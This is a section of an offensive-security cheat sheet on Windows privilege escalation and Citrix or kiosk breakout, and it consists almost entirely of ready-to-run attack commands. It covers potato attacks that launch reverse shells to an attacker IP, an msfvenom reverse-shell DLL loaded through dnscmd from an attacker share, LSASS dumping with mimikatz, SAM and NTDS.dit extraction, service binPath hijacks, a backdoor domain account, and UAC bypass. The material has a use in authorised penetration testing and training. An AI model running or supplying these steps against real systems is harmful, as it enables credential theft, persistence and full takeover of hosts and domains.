## 8.2 - Windows PrivEsc

> Run WinPEAS first, then follow decision tree.
> Always check protections (Defender, AppLocker) before uploading tools.

### Enumeration Scripts
```powershell
# WinPEAS (comprehensive)
.\winPEASany.exe
.\winPEASany.exe quiet fast

# Seatbelt (security-focused)
.\Seatbelt.exe -group=all -full

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# JAWS
.\jaws-enum.ps1
```

### Manual Enumeration
```powershell
# Situational awareness (do FIRST)
whoami /priv                    # Privileges
whoami /groups                  # Group membership
systeminfo                      # OS version, hotfixes
hostname
ipconfig /all                   # Network interfaces (pivot targets!)
arp -a                          # ARP table
route print                     # Routing table
netstat -ano                    # Listening ports (localhost-only services)

# Protections (determine approach)
Get-MpComputerStatus            # Defender status
Get-AppLockerPolicy -Effective  # AppLocker rules
$ExecutionContext.SessionState.LanguageMode  # PS language mode

# Users and groups
net user
net localgroup
net localgroup administrators
query user                      # Logged-on users

# Services
wmic service get name,displayname,pathname,startmode | findstr /i "auto"
sc query                        # Service status
sc qc <service>                 # Service config (binpath, start type)

# Scheduled tasks
schtasks /query /fo LIST /v

# Registry autorun
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Credential hunting
cmdkey /list
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt 2>$null
findstr /SIM /C:"password" C:\Users\*.txt C:\Users\*.xml C:\Users\*.ini C:\Users\*.config 2>$null

# Installed software (third-party vulns)
wmic product get name,version
schtasks /query /fo LIST /v | findstr /i "task"

# Named pipes (misconfigs)
pipelist.exe                    # List all pipes
gci \\.\pipe\                   # PowerShell alternative
accesschk.exe /accepteula -w \pipe\*  # Check pipe permissions
```

### Decision Tree
```
What privileges do we have?
├── SeImpersonatePrivilege → JuicyPotato (≤2016), PrintSpoofer (2019+), GodPotato (newer)
├── SeDebugPrivilege → ProcDump LSASS, Mimikatz sekurlsa::minidump, psgetsystem
├── SeBackupPrivilege → VSS copy, diskshadow, robocopy /B, extract NTDS.dit
├── SeTakeOwnershipPrivilege → takeown + icacls on protected files
├── SeRestorePrivilege → Write to protected locations
├── SeLoadDriverPrivilege → Capcom.sys driver loading → SYSTEM
├── Unquoted Service Path → Insert malicious exe in path
├── Writable Service Binary → Replace with reverse shell
├── Service Misconfig → sc config binpath= (SERVICE_ALL_ACCESS)
├── DLL Hijacking → Find missing DLLs with ProcMonitor, place malicious DLL
├── Always Install Elevated → Malicious MSI (HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer)
├── Stored Credentials → cmdkey /list, Credential Manager, Import-Clixml
├── Scheduled Task → Writable script running as SYSTEM
├── Registry AutoRun → Modify autorun keys (HKLM/HKCU Run)
├── Named Pipe Abuse → Writable pipe, impersonation via pipe
├── DnsAdmins Group → dnscmd /config /serverlevelplugindll → restart DNS
├── Server Operators Group → sc config binpath on DC services
├── Print Operators Group → SeLoadDriverPrivilege → Capcom.sys
├── UAC Bypass → EnableLUA check, SystemPropertiesAdvanced.exe DLL hijack
├── Kernel Exploit → searchsploit windows kernel <version>
│   ├── HiveNightmare (CVE-2021-36934) → icacls check, HiveNightmare.exe
│   ├── PrintNightmare (CVE-2021-34527) → ls \\localhost\pipe\spoolss
│   ├── CVE-2020-0668 → File-move exploit
│   └── SeriousSam (CVE-2021-36934) → SAM/SYSTEM read
├── VHDX/VMDK on shares → Mount-VHD, extract SAM/SYSTEM/SECURITY offline
├── Third-party services → wmic product, localhost-only services, DLL hijack
└── Token Impersonation → potato attacks
```

### Potato Attacks
```bash
# JuicyPotato (Server 2016 and below, needs SeImpersonatePrivilege)
JuicyPotato.exe -l <port> -p c:\windows\system32\cmd.exe -a "/c <reverse_shell>" -t *

# PrintSpoofer (Server 2019+, needs SeImpersonatePrivilege)
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "<reverse_shell>"

# GodPotato (newer Windows, needs SeImpersonatePrivilege)
GodPotato.exe -cmd "cmd /c <reverse_shell>"

# RoguePotato (Server 2019/Win10 1809+, needs SeImpersonatePrivilege)
RoguePotato.exe -r <attacker_ip> -e "cmd.exe /c <reverse_shell>" -l 9999

# Check current privileges first
whoami /priv | findstr /i "SeImpersonate SeAssignPrimaryToken"
```

### Windows Built-in Group Abuse (often listed in `whoami /groups`)
```powershell
# === Backup Operators (SeBackupPrivilege + SeRestorePrivilege implicit) ===
# 1. Dump SAM+SYSTEM via reg.exe save (uses backup priv)
reg save HKLM\SAM C:\Windows\Temp\sam.save
reg save HKLM\SYSTEM C:\Windows\Temp\system.save
reg save HKLM\SECURITY C:\Windows\Temp\security.save
# 2. Offline extraction
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
# 3. On DC: dump NTDS.dit via VSS / diskshadow
diskshadow.exe /s commands.txt    # see §8.2 SeBackup chain

# === Server Operators ===
# Can stop/start services + modify binPath on existing services
# 1. List services
sc.exe query state= all
# 2. Pick one running as SYSTEM (e.g. AppReadiness)
sc.exe qc AppReadiness
# 3. Replace binPath with reverse-shell payload, restart service
sc.exe config AppReadiness binPath= "C:\Windows\Temp\shell.exe"
sc.exe stop AppReadiness
sc.exe start AppReadiness
# 4. Restore original binPath after callback
sc.exe config AppReadiness binPath= "C:\Windows\System32\AppReadiness.dll"

# === Print Operators ===
# SeLoadDriverPrivilege → load malicious driver → SYSTEM (Capcom.sys technique)
# 1. Drop Capcom.sys + EOPLoadDriver.exe on target
# 2. Load: EOPLoadDriver.exe System\CurrentControlSet\MyService C:\Temp\Capcom.sys
# 3. Run exploit triggering Capcom → SYSTEM shell
# Reference: github.com/tandasat/ExploitCapcom

# === DnsAdmins ===
# Can load arbitrary DLL into DNS service (runs as SYSTEM)
# 1. Generate DLL payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker> LPORT=4444 -f dll > /tmp/mimilib.dll
# 2. Drop DLL on share + set ServerLevelPluginDll
dnscmd.exe <dc> /config /serverlevelplugindll \\<attacker>\share\mimilib.dll
# 3. Restart DNS service (need to also be in Server Operators / Administrators)
sc.exe \\<dc> stop dns
sc.exe \\<dc> start dns
# Alternative: wait for DNS to crash + restart

# === Hyper-V Administrators ===
# Can mount VHDs of any VM including DCs
# 1. List VMs
Get-VM
# 2. Snapshot DC → offline-mount its VHD
Checkpoint-VM -Name DC01
Get-VMSnapshot -VMName DC01
# 3. Mount VHD copy → access NTDS.dit / SAM directly
Mount-VHD -Path C:\path\to\DC01-snapshot.vhdx -ReadOnly
# 4. Extract NTDS.dit + SYSTEM hive → secretsdump.py LOCAL → krbtgt hash

# === Event Log Readers ===
# Can read Security log → may contain creds passed via cmdline (4688 events)
wevtutil qe Security /q:"*[EventData[Data[@Name='SubjectUserName']!='SYSTEM']]" /c:30 /rd:true /f:text
wevtutil qe Security /rd:true /f:text /q:"*[System[(EventID=4688)]]" | findstr /i "password pass user"
# Old PowerShell logs (4688 if cmdline auditing enabled)
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4688]]" | ? { $_.Message -match "pass" }

# === Account Operators ===
# Can create/modify non-protected user accounts + add to non-admin groups
net user backdoor Pass123! /add /domain
# CANNOT modify Domain Admins / Account Operators / Backup Operators / Server Operators directly
# But CAN modify GenericWrite-targets (chain via BloodHound)

# === Group Policy Creator Owners ===
# Can create new GPOs and link to OUs they own
# Chain: create GPO with malicious scheduled task → link to OU containing target → run
```

### SeDebugPrivilege Abuse
```powershell
# Dump LSASS as current user (if SeDebugPrivilege)
procdump.exe -accepteula -ma lsass.exe C:\lsass.dmp
mimikatz # sekurlsa::minidump C:\lsass.dmp
mimikatz # sekurlsa::logonpasswords

# Get SYSTEM via parent process PID targeting
# psgetsystem.ps1 - targets winlogon/lsass parent PID
```

### SeBackupPrivilege Full Chain
```powershell
# Import SeBackupPrivilege DLLs
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

# Copy SAM/SYSTEM via VSS
diskshadow
DISKSHADOW> set context persistent
DISKSHADOW> add volume c: alias test
DISKSHADOW> create
DISKSHADOW> expose %test% z:
# Then: copy z:\Windows\NTDS\ntds.dit C:\temp\ntds.dit

# Robocopy with backup privilege
robocopy /B C:\Windows\NTDS C:\temp\ntds.dit

# Offline extraction
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

### UAC Bypass
```powershell
# Check UAC level
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
# EnableLUA = 1 (UAC enabled)
# ConsentPromptBehaviorAdmin = 5 (default) or 2 (no prompt for admins)

# Bypass (UACME technique 54 - SystemPropertiesAdvanced.exe DLL hijack)
# Only works when admin but not elevated
copy C:\Windows\System32\<target>.dll C:\Users\<user>\AppData\Local\Microsoft\WindowsApps\
# Trigger: run SystemPropertiesAdvanced.exe
```

### DLL Hijacking
```powershell
# Find missing DLLs with ProcMonitor (Process Monitor)
# Filter: Result = NAME NOT FOUND, Path ends in .dll
# Check writable directories in PATH

# Verify writable path
accesschk.exe /accepteula -w "C:\Program Files\Target" Users
# Place malicious DLL in writable path → restart service
```

## 8.3 - Citrix / Restricted Desktop Breakout
> Citrix, Terminal Services, AWS AppStream, CyberArk PSM, Kiosks — locked-down environments.
> Goal: spawn `cmd.exe` from a restricted desktop, then privesc normally.

**Method 1 — Dialog box → UNC path:**
```
1. Open ANY app with File→Open dialog (Paint, Notepad, WordPad, browser, even Help)
2. In file-name field, type UNC path:
   \\127.0.0.1\c$\windows\system32          → if you have local admin
   \\127.0.0.1\c$\users\<user>              → bypass Explorer restrictions
   \\<attacker>\share                       → reach attacker SMB share
3. Right-click cmd.exe / pwn.exe → Open → command prompt spawned
```

**Method 2 — Alternate file manager:**
```
- Explorer++ (portable) → bypasses GP restrictions on Explorer
- Q-Dir, FreeCommander → same
- Drop via UNC share + run
```

**Method 3 — Alternate registry editor:**
```
- SmallRegistryEditor / SimpleRegEdit / UberRegEdit → bypass regedit lockdown
```

**Method 4 — Shortcut hijack:**
```
1. Right-click existing .lnk file → Properties
2. Change Target to: C:\Windows\System32\cmd.exe
3. Double-click → cmd spawned
```

**Method 5 — Script extension execution:**
```bash
# If .bat/.vbs/.ps1 still associated with interpreter
echo cmd > evil.bat
# Or PowerShell launcher (if powershell restricted, try psh-base64)
echo Set-ExecutionPolicy Bypass -Scope Process -Force > evil.ps1
echo Start-Process cmd.exe >> evil.ps1
# Double-click on Desktop → command shell
```

**Method 6 — Custom compiled "pwn.exe":**
```c
// pwn.c — minimal cmd launcher (drop via SMB share)
#include <stdlib.h>
int main() { system("C:\\Windows\\System32\\cmd.exe"); return 0; }
```
```bash
# Cross-compile from Linux
i686-w64-mingw32-gcc pwn.c -o pwn.exe
# Drop on SMB share → right-click Open from dialog
```

**Then escalate normally:**
```
- AlwaysInstallElevated check + Write-UserAddMSI (PowerUp)
- WinPEAS / Seatbelt / PowerUp
- UAC bypass (Bypass-UAC.ps1 -Method UacMethodSysprep)
- Token/Potato attacks → SYSTEM
```

---